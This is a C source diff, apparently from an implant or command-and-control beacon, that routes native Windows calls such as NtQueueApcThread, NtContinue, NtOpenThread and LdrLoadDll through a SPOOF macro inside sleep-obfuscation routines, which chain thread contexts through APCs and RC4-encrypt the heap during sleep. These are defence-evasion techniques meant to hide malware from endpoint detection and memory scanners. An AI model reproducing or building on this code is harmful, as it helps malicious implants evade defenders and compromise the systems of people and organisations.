@@ -85,7 +85,7 @@ SECTION( D ) BOOL isCFGEnforced( PAPI pApi )
         PrInfo.ExtendedProcessInfo = ProcessControlFlowGuardPolicy;
         PrInfo.ExtendedProcessInfoBuffer = 0;
 
-        if( pApi->ntdll.NtQueryInformationProcess( ( ( HANDLE )-1 ), ProcessCookie | ProcessUserModeIOPL, &PrInfo, sizeof( PrInfo ), NULL ) == STATUS_SUCCESS )
+        if ( SPOOF( pApi->ntdll.NtQueryInformationProcess, NULL, NULL, ( HANDLE )-1, C_PTR( ( ProcessCookie | ProcessUserModeIOPL ) ), &PrInfo, C_PTR( sizeof( PrInfo ) ), NULL ) == STATUS_SUCCESS )
         {
             return TRUE;
         };
@@ -135,7 +135,7 @@ SECTION( D ) NTSTATUS queueAPCs( PAPI pApi, PCONTEXT* contexts, HANDLE hThread )
     NTSTATUS Status;
     for( int i = 9; i >= 0; i-- )
     {
-        Status = pApi->ntdll.NtQueueApcThread( hThread, C_PTR( pApi->ntdll.NtContinue ), contexts[i], NULL, NULL );
+        Status = SPOOF( pApi->ntdll.NtQueueApcThread, NULL, NULL, hThread, C_PTR( pApi->ntdll.NtContinue ), contexts[i], NULL, NULL );
         if( Status != STATUS_SUCCESS )
         {
             break;
@@ -177,9 +177,9 @@ SECTION( D ) VOID startSleepChain( PAPI pApi, HANDLE hThread, HANDLE hEvent )
 {
     ULONG outSuspendCount  = 0;
 
-    if( pApi->ntdll.NtAlertResumeThread( hThread, &outSuspendCount ) == STATUS_SUCCESS )
+    if( SPOOF( pApi->ntdll.NtAlertResumeThread, NULL, NULL, hThread, &outSuspendCount ) == STATUS_SUCCESS )
     {
-        pApi->ntdll.NtSignalAndWaitForSingleObject( hEvent, hThread, TRUE, NULL );
+        SPOOF( pApi->ntdll.NtSignalAndWaitForSingleObject, NULL, NULL, hEvent, hThread, C_PTR( TRUE ), NULL );
     };
 };
 
@@ -202,7 +202,7 @@ SECTION( D ) NTSTATUS openOriginalThread( PAPI pApi, PHANDLE thread )
     Cid.UniqueThread = NtCurrentTeb()->ClientId.UniqueThread;
     ObjAddr.Length = sizeof( ObjAddr );
     
-    Status = pApi->ntdll.NtOpenThread( thread, THREAD_ALL_ACCESS, &ObjAddr, &Cid );
+    Status = SPOOF( pApi->ntdll.NtOpenThread, NULL, NULL, thread, C_PTR( THREAD_ALL_ACCESS ), &ObjAddr, &Cid );
 
     return Status;
 };
@@ -281,12 +281,12 @@ SECTION( D ) VOID delayExec( PAPI pApi, PIMAGE_DOS_HEADER OverloadModule )
     Status = setupThreads( pApi, &OrigThd, &WaitThd );
     CHECKERR( Status );
     
-    Status = pApi->ntdll.NtCreateEvent( &SyncEvt, EVENT_ALL_ACCESS, NULL, 1, FALSE );
+    Status = SPOOF( pApi->ntdll.NtCreateEvent, NULL, NULL, &SyncEvt, C_PTR( EVENT_ALL_ACCESS ), NULL, C_PTR( 1 ), C_PTR( FALSE ) );
     CHECKERR( Status );
 
     initContexts( pApi, Contexts );
 
-    Status = pApi->ntdll.NtGetContextThread( WaitThd, Contexts[11] );
+    Status = SPOOF( pApi->ntdll.NtGetContextThread, NULL, NULL, WaitThd, Contexts[11] );
     CHECKERR( Status );
 
     addCommonStackData( pApi, Contexts );
@@ -362,18 +362,18 @@ cleanup:
     
     if( WaitThd )
     {
-        pApi->ntdll.NtTerminateThread( WaitThd, STATUS_SUCCESS );
-        pApi->ntdll.NtClose( WaitThd );
+        SPOOF( pApi->ntdll.NtTerminateThread, NULL, NULL, WaitThd, C_PTR( STATUS_SUCCESS ) );
+        SPOOF( pApi->ntdll.NtClose, NULL, NULL, WaitThd );
     };
     
     if( OrigThd )
     {
-        pApi->ntdll.NtClose( OrigThd );
+        SPOOF( pApi->ntdll.NtClose, NULL, NULL, OrigThd );
     };
     
     if( SyncEvt )
     {
-        pApi->ntdll.NtClose( SyncEvt );
+        SPOOF( pApi->ntdll.NtClose, NULL, NULL, SyncEvt );
     };
 
     RtlSecureZeroMemory( &S32Data, sizeof( S32Data ) );
@@ -390,7 +390,7 @@ SECTION( D ) VOID encryptHeap( PAPI pApi )
     S32Key.len = S32Key.maxlen = KEY_SIZE;
     S32Key.str = pApi->enckey;
 
-    while ( NT_SUCCESS( pApi->ntdll.RtlWalkHeap( GetProcessHeap_Hook(), &Entry ) ) )
+    while ( NT_SUCCESS( SPOOF( pApi->ntdll.RtlWalkHeap, NULL, NULL, GetProcessHeap_Hook(), &Entry  ) ) )
     {
         if( ( Entry.Flags & RTL_PROCESS_HEAP_ENTRY_BUSY ) != 0 )
         {
@@ -461,7 +461,7 @@ SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
     if( !pApi->hAdvapi )
     {
         pApi->ntdll.RtlInitUnicodeString( &Uni, C_PTR( OFFSET( L"advapi32.dll" ) ) );
-        pApi->ntdll.LdrLoadDll( NULL, 0, &Uni, &pApi->hAdvapi );
+        SPOOF( pApi->ntdll.LdrLoadDll, NULL, NULL, C_PTR( 0 ), &Uni, &pApi->hAdvapi );
 
         if( !pApi->hAdvapi )
         {
@@ -470,7 +470,7 @@ SECTION( D ) NTSTATUS resolveSleepHookFunctions( PAPI pApi )
     };
     
     pApi->ntdll.RtlInitAnsiString( &Str, C_PTR( OFFSET( "SystemFunction032" ) ) );
-    pApi->ntdll.LdrGetProcedureAddress( pApi->hAdvapi, &Str, 0, ( PVOID* )&pApi->advapi.SystemFunction032 );
+    SPOOF( pApi->ntdll.LdrGetProcedureAddress, NULL, NULL, pApi->hAdvapi, &Str, C_PTR( 0 ), ( PVOID* )&pApi->advapi.SystemFunction032 );
     
     RtlSecureZeroMemory( &Uni, sizeof( Uni ) );
     RtlSecureZeroMemory( &Str, sizeof( Str ) );
